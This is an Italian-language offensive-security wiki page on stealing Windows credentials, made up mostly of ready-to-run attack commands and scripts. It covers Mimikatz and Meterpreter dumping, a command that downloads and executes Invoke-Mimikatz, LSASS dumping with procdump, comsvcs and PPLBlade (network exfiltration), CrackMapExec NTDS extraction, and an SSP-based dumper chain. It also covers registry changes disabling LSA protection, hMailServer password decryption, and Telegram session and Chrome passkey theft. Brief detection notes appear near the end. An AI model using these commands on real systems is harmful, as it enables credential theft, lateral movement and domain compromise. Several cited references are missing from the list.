# Furto delle credenziali Windows

{{#include ../../banners/hacktricks-training.md}}

## Credenziali Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Trova altre cose che Mimikatz può fare in** [**questa pagina**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Scopri alcune possibili protezioni delle credenziali qui.**](credentials-protections.md) **Queste protezioni potrebbero impedire a Mimikatz di estrarre alcune credenziali.**

## Credenziali con Meterpreter

Usa il [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **che** ho creato per **cercare password e hash** all'interno della vittima.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassing AV

### Procdump + Mimikatz

Poiché **Procdump di** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**è un tool legittimo di Microsoft**, non viene rilevato da Defender.\
Puoi usare questo tool per **eseguire il dump del processo lsass**, **scaricare il dump** ed **estrarre** le **credenziali localmente** dal dump.

Puoi anche usare [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Questo processo viene eseguito automaticamente con [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Alcuni **AV** potrebbero **rilevare** come **malevolo** l'uso di **procdump.exe per eseguire il dump di lsass.exe**, perché stanno **rilevando** le stringhe **"procdump.exe" e "lsass.exe"**. Pertanto, è più **stealthy** passare come **argomento** il **PID** di lsass.exe a procdump **anziché** il **nome lsass.exe.**

### Dumping di lsass con **comsvcs.dll**

Una DLL denominata **comsvcs.dll**, presente in `C:\Windows\System32`, è responsabile del **dump della memoria del processo** in caso di crash. Questa DLL include una **funzione** denominata **`MiniDumpW`**, progettata per essere invocata tramite `rundll32.exe`.\
È irrilevante utilizzare i primi due argomenti, mentre il terzo è suddiviso in tre componenti. L'ID del processo di cui eseguire il dump costituisce il primo componente, il percorso del file di dump rappresenta il secondo e il terzo componente è esclusivamente la parola **full**. Non esistono opzioni alternative.\
Dopo aver analizzato questi tre componenti, la DLL viene utilizzata per creare il file di dump e trasferire la memoria del processo specificato in questo file.\
L'utilizzo di **comsvcs.dll** è possibile per eseguire il dump del processo lsass, eliminando così la necessità di caricare ed eseguire procdump. Questo metodo è descritto in dettaglio all'indirizzo [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Il seguente comando viene utilizzato per l'esecuzione:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Puoi automatizzare questo processo con** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping di lsass con Task Manager**

1. Fai clic con il pulsante destro del mouse sulla barra delle applicazioni e fai clic su Task Manager
2. Fai clic su Altri dettagli
3. Cerca il processo "Local Security Authority Process" nella scheda Processi
4. Fai clic con il pulsante destro del mouse sul processo "Local Security Authority Process" e fai clic su "Create dump file".

### Dumping di lsass con procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) è un binario firmato da Microsoft che fa parte della suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumping lsass con PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) è un Protected Process Dumper Tool che supporta l'offuscamento del memory dump e il trasferimento su workstation remote senza scriverlo sul disco.

**Funzionalità principali**:

1. Bypass della protezione PPL
2. Offuscamento dei file di memory dump per eludere i meccanismi di rilevamento basati sulle signature di Defender
3. Upload del memory dump con metodi di upload RAW e SMB senza scriverlo sul disco (dump fileless)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – dumping di LSASS basato su SSP senza MiniDumpWriteDump

Ink Dragon include un dumper in tre fasi denominato **LalsDumper** che non chiama mai `MiniDumpWriteDump`, quindi gli hook EDR su quell'API non si attivano:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – cerca in `fdp.dll` un placeholder composto da 32 caratteri `d` minuscoli, lo sovrascrive con il percorso assoluto di `rtu.txt`, salva la DLL modificata come `nfdp.dll` e chiama `AddSecurityPackageA("nfdp","fdp")`. Questo forza **LSASS** a caricare la DLL malevola come nuovo Security Support Provider (SSP).
2. **Stage 2 all'interno di LSASS** – quando LSASS carica `nfdp.dll`, la DLL legge `rtu.txt`, applica XOR a ogni byte con `0x20` e mappa il blob decodificato in memoria prima di trasferirvi l'esecuzione.
3. **Stage 3 dumper** – il payload mappato reimplementa la logica di MiniDump usando **direct syscalls** risolte a partire da nomi di API sottoposti a hashing (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Un export dedicato denominato `Tom` apre `%TEMP%\<pid>.ddt`, trasmette un dump compresso di LSASS nel file e chiude l'handle, così l'exfiltration può avvenire in seguito.

Note per l'operatore:

* Mantieni `lals.exe`, `fdp.dll`, `nfdp.dll` e `rtu.txt` nella stessa directory. Stage 1 riscrive il placeholder hard-coded con il percorso assoluto di `rtu.txt`, quindi separarli interrompe la catena.
* La registrazione avviene aggiungendo `nfdp` a `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Puoi impostare personalmente quel valore per fare in modo che LSASS ricarichi l'SSP a ogni avvio.
* I file `%TEMP%\*.ddt` sono dump compressi. Decomprimili localmente, quindi passali a Mimikatz/Volatility per l'estrazione delle credenziali.
* L'esecuzione di `lals.exe` richiede diritti admin/SeTcb affinché `AddSecurityPackageA` abbia successo; una volta restituito il controllo dalla chiamata, LSASS carica in modo trasparente l'SSP rogue ed esegue Stage 2.
* Rimuovere la DLL dal disco non la espelle da LSASS. Elimina la voce del registro e riavvia LSASS (riavviando il sistema), oppure lasciala per ottenere persistenza a lungo termine.

## CrackMapExec

### Scaricare gli hash SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump dei segreti LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump di NTDS.dit dal DC target
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Estrazione della cronologia delle password di NTDS.dit dal DC target
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Mostra l'attributo pwdLastSet per ogni account NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Furto di SAM e SYSTEM

Questi file dovrebbero trovarsi in _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM._ Tuttavia, **non puoi semplicemente copiarli nel modo consueto** perché sono protetti.

### Dal Registry

Il modo più semplice per rubare questi file consiste nell'ottenere una copia dal Registry:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Scarica** quei file sulla tua macchina Kali ed **estrai gli hash** usando:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

È possibile copiare file protetti utilizzando questo servizio. È necessario essere Administrator.

#### Using vssadmin

Il binary `vssadmin` è disponibile solo nelle versioni Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ma puoi fare lo stesso da **Powershell**. Questo è un esempio di **come copiare il file SAM** (l'unità utilizzata è "C:" e il file viene salvato in C:\users\Public), ma puoi usarlo per copiare qualsiasi file protetto:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Infine, potresti anche usare lo [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) per creare una copia di SAM, SYSTEM e ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Credenziali di Active Directory - NTDS.dit**

Il file **NTDS.dit** è noto come il cuore di **Active Directory** e contiene dati fondamentali sugli oggetti utente, sui gruppi e sulle relative appartenenze. È qui che vengono archiviati gli **hash delle password** degli utenti del dominio. Questo file è un database **Extensible Storage Engine (ESE)** e si trova in **_%SystemRoom%/NTDS/ntds.dit_**.

All'interno di questo database vengono gestite tre tabelle principali:

- **Data Table**: questa tabella ha il compito di archiviare i dettagli relativi a oggetti come utenti e gruppi.
- **Link Table**: tiene traccia delle relazioni, come le appartenenze ai gruppi.
- **SD Table**: qui vengono conservati i **descrittori di sicurezza** per ogni oggetto, garantendo la sicurezza e il controllo degli accessi per gli oggetti archiviati.

La ricerca di Christoffer Andersson sul database layer documenta queste tabelle e il loro comportamento specifico per versione in maggiore dettaglio.<sup>[[8]](#references)</sup>

Windows utilizza _Ntdsa.dll_ per interagire con quel file, e questo viene utilizzato da _lsass.exe_. Di conseguenza, una **parte** del file **NTDS.dit** potrebbe trovarsi nella memoria di **`lsass`** (è probabilmente possibile trovare i dati a cui è stato effettuato l'accesso più recentemente grazie al miglioramento delle prestazioni ottenuto tramite una **cache**).

#### Decrittografia degli hash all'interno di NTDS.dit

L'hash viene crittografato tre volte:

1. Decrittografare la Password Encryption Key (**PEK**) utilizzando **BOOTKEY** e **RC4**.
2. Decrittografare l'**hash** utilizzando **PEK** e **RC4**.
3. Decrittografare l'**hash** utilizzando **DES**.

La **PEK** ha lo **stesso valore su ogni domain controller**, ma è **crittografata** all'interno di **NTDS.dit** con il **BOOTKEY** specifico del DC proveniente dall'hive **SYSTEM** di quel domain controller. Pertanto, l'estrazione delle credenziali richiede sia **NTDS.dit** sia **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Copiare NTDS.dit utilizzando Ntdsutil

Disponibile da Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Puoi anche usare il trucco della [**volume shadow copy**](#stealing-sam-and-system) per copiare il file **ntds.dit**. Ricorda che ti servirà anche una copia del **file SYSTEM** (di nuovo, usa il trucco per [**scaricarlo dal registro o usare la volume shadow copy**](#stealing-sam-and-system)).

### **Estrazione degli hash da NTDS.dit**

Una volta **ottenuti** i file **NTDS.dit** e **SYSTEM**, puoi usare strumenti come _secretsdump.py_ per **estrarre gli hash**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Puoi anche **estrarli automaticamente** utilizzando un utente amministratore di dominio valido:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Per i file **NTDS.dit di grandi dimensioni** si consiglia di estrarli usando [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Infine, puoi anche usare il **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ o **mimikatz** `lsadump::lsa /inject`

### **Estrazione degli oggetti di dominio da NTDS.dit in un database SQLite**

Gli oggetti NTDS possono essere estratti in un database SQLite con [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Vengono estratti non solo i secrets, ma anche gli oggetti completi e i relativi attributi, per un'ulteriore estrazione di informazioni quando il file NTDS.dit raw è già stato recuperato.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
L'hive `SYSTEM` è opzionale, ma consente la decrittografia dei secrets (hash NT e LM, credenziali supplementari come password in chiaro, chiavi kerberos o trust, cronologia delle password NT e LM). Insieme ad altre informazioni, vengono estratti i seguenti dati: account utente e macchina con i relativi hash, flag UAC, timestamp dell'ultimo accesso e dell'ultima modifica della password, descrizione degli account, nomi, UPN, SPN, gruppi e appartenenze ricorsive, struttura e appartenenza delle unità organizzative, domini trusted con tipo, direzione e attributi delle relazioni di trust...

## Lazagne

Scarica il binario da [qui](https://github.com/AlessandroZ/LaZagne/releases). Puoi usare questo binario per estrarre le credenziali da diversi software.
```
lazagne.exe all
```
## Altri strumenti per estrarre credenziali da SAM e LSASS

### Windows credentials Editor (WCE)

Questo strumento può essere utilizzato per estrarre credenziali dalla memoria. Scaricalo da: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Estrai le credenziali dal file SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Estrai le credenziali dal file SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Scaricalo da:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) e semplicemente **eseguilo**: le password verranno estratte.

## Analisi delle sessioni RDP inattive e indebolimento dei controlli di sicurezza

Il RAT FinalDraft di Ink Dragon include un tasker `DumpRDPHistory`, le cui tecniche sono utili per qualsiasi red-teamer:<sup>[[3]](#references)</sup>

### Raccolta della telemetria in stile DumpRDPHistory

* **Target RDP in uscita** – analizza ogni user hive in `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Ogni subkey memorizza il nome del server, `UsernameHint` e il timestamp dell'ultima modifica. Puoi replicare la logica di FinalDraft con PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Evidenze RDP in ingresso** – interroga il log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` per gli Event ID **21** (accesso riuscito) e **25** (disconnessione), per determinare chi ha amministrato il sistema:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Una volta individuato il Domain Admin che si connette regolarmente, esegui il dump di LSASS (con LalsDumper/Mimikatz) mentre la sua sessione **disconnessa** è ancora presente. Il fallback CredSSP + NTLM lascia il suo verifier e i suoi token in LSASS, che possono quindi essere riutilizzati tramite SMB/WinRM per ottenere `NTDS.dit` o predisporre la persistence sui domain controller.

### Downgrade del Registry mirati da FinalDraft

Lo stesso implant modifica inoltre diverse registry key per facilitare il credential theft:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* L'impostazione `DisableRestrictedAdmin=1` forza il riutilizzo completo delle credenziali/dei ticket durante RDP, consentendo pivot in stile pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` disabilita il filtraggio dei token UAC, in modo che gli amministratori locali ottengano token senza restrizioni attraverso la rete.
* `DSRMAdminLogonBehavior=2` consente all'amministratore DSRM di effettuare il logon mentre il DC è online, fornendo agli attacker un altro account integrato con privilegi elevati.
* `RunAsPPL=0` rimuove le protezioni PPL di LSASS, rendendo banale l'accesso alla memoria per dumper come LalsDumper.

## Credenziali del database di hMailServer (post-compromise)

hMailServer memorizza la password del DB in `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`, nella sezione `[Database] Password=`. Il valore è cifrato con Blowfish usando la chiave statica `THIS_KEY_IS_NOT_SECRET` e swap di endianness di word da 4 byte. Usa la stringa esadecimale dell'INI con questo snippet Python:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Con la password in chiaro, copia il database SQL CE per evitare i blocchi dei file, carica il provider a 32 bit ed esegui l'upgrade se necessario prima di interrogare gli hash:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
La colonna `accountpassword` utilizza il formato hash di hMailServer (modalità hashcat `1421`). Il cracking di questi valori può fornire credenziali riutilizzabili per pivot WinRM/SSH.

## Intercettazione del callback di logon LSA (LsaApLogonUserEx2)

Alcuni tool catturano **password di logon in chiaro** intercettando il callback di logon LSA `LsaApLogonUserEx2`. L'idea consiste nell'effettuare l'hook o il wrapping del callback del pacchetto di autenticazione, in modo da catturare le credenziali **durante il logon** (prima dell'hashing), per poi scriverle su disco o restituirle all'operatore. Questa tecnica viene comunemente implementata tramite un helper che esegue l'injection o si registra con LSA, quindi registra ogni evento di logon interattivo/di rete riuscito con username, dominio e password.<sup>[[1]](#references)</sup>

Note operative:
- Richiede privilegi di amministratore locale/SYSTEM per caricare l'helper nel percorso di autenticazione.
- Le credenziali catturate compaiono solo quando si verifica un logon (interattivo, RDP, di servizio o di rete, a seconda dell'hook).

## Credenziali di connessione salvate da SSMS (sqlstudio.bin)

SQL Server Management Studio (SSMS) memorizza le informazioni sulle connessioni salvate in un file `sqlstudio.bin` specifico per ogni utente. I dumper dedicati possono analizzare il file e recuperare le credenziali SQL salvate. Nelle shell che restituiscono solo l'output dei comandi, il file viene spesso esfiltrato codificandolo come Base64 e stampandolo su stdout.<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Dal lato dell'operatore, ricostruisci il file ed esegui localmente il dumper per recuperare le credenziali:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Furto della sessione `tdata` di Telegram Desktop

Telegram Desktop conserva l'autorizzazione e lo stato dell'account nella directory **`tdata`**. Una sessione copiata può essere caricata da strumenti compatibili per autenticarsi senza la password dell'account finché tale autorizzazione rimane valida; se la crittografia dei dati locali è abilitata, lo stealer necessita anche del relativo passcode. Una sessione autenticata può quindi esporre dati sull'identità, metadati di dialoghi e appartenenze, messaggi e contenuti multimediali scaricabili.<sup>[[10]](#references)</sup>

### Individuazione e acquisizione

Cerca sia i layout installati sia quelli portatili; i nomi dei pacchetti Microsoft Store variano, quindi enumera le directory dei pacchetti che contengono `TelegramMessenge` e analizza il relativo sottoalbero `LocalCache\Roaming`.<sup>[[10]](#references)</sup>
```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
Where-Object Name -Like '*TelegramMessenge*' |
ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```
Se le letture ordinarie falliscono e il token del processo **contiene già ed abilita** `SeBackupPrivilege`, l'accesso compatibile con il backup fornisce un'alternativa; non ottiene il privilegio né eleva il processo. `CreateFileW` con `FILE_FLAG_BACKUP_SEMANTICS` può richiedere la semantica di backup/ripristino e ignorare i controlli di sicurezza dei file quando sono presenti i privilegi richiesti nel token, ma il flag da solo non aggira un lock di condivisione incompatibile.<sup>[[10]](#references)[[11]](#references)</sup>

Per i file live bloccati, crea un **Volume Shadow Copy**; per i file bloccati dagli ACL, `robocopy /B` usa la modalità backup e ignora gli ACL dei file e delle directory.<sup>[[10]](#references)[[12]](#references)</sup>
```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```
Un implant attento alla larghezza di banda può inviare inizialmente solo l’inventario dei percorsi dei file, ricevere un identificatore dello snapshot insieme ai percorsi già archiviati dal C2 e caricare soltanto i file mancanti. Pertanto, piccoli trasferimenti incrementali dopo l’enumerazione ricorsiva di `tdata` possono comunque indicare il successo del furto della sessione.<sup>[[10]](#references)</sup>

### Rilevamento e contenimento

Correlate l’accesso ricorsivo a `tdata` da parte di un processo non-Telegram con l’abilitazione di `SeBackupPrivilege`, l’apertura di file con semantica di backup, l’attività VSS o un processo figlio `robocopy.exe` che utilizza `/B`. Cercate inoltre un’enumerazione rapida sia di `%APPDATA%` sia di `%LOCALAPPDATA%\Packages`, seguita da connessioni in uscita dallo stesso processo. Dopo la compromissione, utilizzate **Settings → Devices** (oppure **Privacy & Security → Active Sessions**) per terminare le sessioni non riconosciute; l’abilitazione della verifica in due passaggi, da sola, non revoca un’autorizzazione che è già stata rubata.<sup>[[10]](#references)[[13]](#references)</sup>

## Furto di credenziali Passkeys / WebAuthn da Chrome su Windows

Se si ottiene l’esecuzione di codice come **utente vittima** su un host Windows che utilizza **passkeys sincronizzate con Google Password Manager in Chrome**, le passkeys diventano un interessante obiettivo di post-exploitation anche **senza admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Artefatti locali interessanti
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** memorizza record **`WebauthnCredentialSpecifics`** codificati in protobuf. Un processo dello stesso utente può enumerare **RP ID**, **username**, **credential ID** e il materiale della chiave privata cifrato per le passkey sincronizzate.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** memorizza lo stato locale di registrazione del dispositivo, come **`wrapped_identity_private_key`** e il segreto wrapped usato per recuperare le credenziali sincronizzate.<sup>[[4]](#references)</sup>

Triage rapida:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### I key blob vincolati al TPM possono comunque essere abusati come oracle locale per la firma

Se il browser esporta una identity key basata su TPM come **`NCRYPT_OPAQUE_KEY_BLOB`** e memorizza quel blob in uno stato accessibile all'utente, il malware **non** deve estrarre la chiave privata grezza. Può semplicemente reimportare il blob sulla **stessa macchina** e chiedere al TPM locale di firmare dati controllati dall'attaccante:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Questo significa che il **hardware binding impedisce l'esportazione off-device, ma non l'uso da parte dello stesso utente sull'endpoint compromesso**.

### Percorsi pratici di abuso

1. **Relay di pass-ta-key / device-identity**<sup>[[4]](#references)</sup>
- Enumerare `WebauthnCredentialSpecifics` dal LevelDB di Chrome.
- Avviare un login con passkey e ottenere una nuova challenge WebAuthn.
- Usare il blob `wrapped_identity_private_key` rubato sul TPM della vittima per firmare il binding della richiesta al cloud-authenticator.
- Inoltrare l'assertion restituita alla relying party.
- Questo è particolarmente utile quando la RP accetta `userVerification=preferred` o non rifiuta assertion con **`UV=0`**.
2. **Hijack della pending UV-key**<sup>[[4]](#references)</sup>
- Forzare il re-onboarding eliminando `passkey_enclave_state` o inviando un'operazione `device/forget` validamente firmata.
- Se l'onboarding lascia il dispositivo in stato **`uv_key_pending`**, registrare una chiave pubblica UV controllata dall'attaccante.
- Se il provider non verifica l'attestation / l'origine dal secure hardware della nuova chiave UV, le firme successive della chiave dell'attaccante vengono trattate come **`UV=1`**.
3. **Furto del master-secret / recupero SDS**<sup>[[4]](#references)</sup>
- Forzare il recovery o il rejoin in modo che Chrome recuperi il master secret delle synced-passkey.
- Monitorare la ricreazione/modifica di `passkey_enclave_state`, quindi eseguire il dump della memoria di Chrome mentre il **security domain secret (SDS)** in chiaro è residente.
- Usare l'SDS recuperato per decrittografare i campi cifrati in ogni record `WebauthnCredentialSpecifics` e recuperare chiavi private WebAuthn portabili.

### Idee per DFIR / rilevamento

- Monitorare la **cancellazione/ricreazione** di `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Generare un alert per l'accesso anomalo a **`Sync Data\LevelDB`** di Chrome da parte di processi non-browser.
- Generare un alert per **dump della memoria di Chrome** o accessi sospetti alla memoria tra processi.
- Analizzare le richieste ripetute del **Google Password Manager recovery PIN** o il re-onboarding imprevisto.
- Ricordare che **`signCount`** di WebAuthn spesso non è utile per le synced passkey perché può rimanere costante; pertanto, il rilevamento dei cloni classico è debole.

## References

- [1] [Unit 42 – Un'indagine su anni di operazioni non rilevate rivolte a settori di alto valore](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: phishing tramite macro VBA di Word via SMTP → decrittografia delle credenziali di hMailServer → Veeam CVE-2023-27532 a SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Dentro Ink Dragon: rivelata la relay network e il funzionamento interno di un'operazione offensiva furtiva](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: una nuova superficie d'attacco nell'autenticazione passwordless](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / archiviazione delle chiavi CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Come funziona realmente l'archivio dati di Active Directory: dentro NTDS.dit (Parte 1)](https://blog.chrisse.se/?p=762)
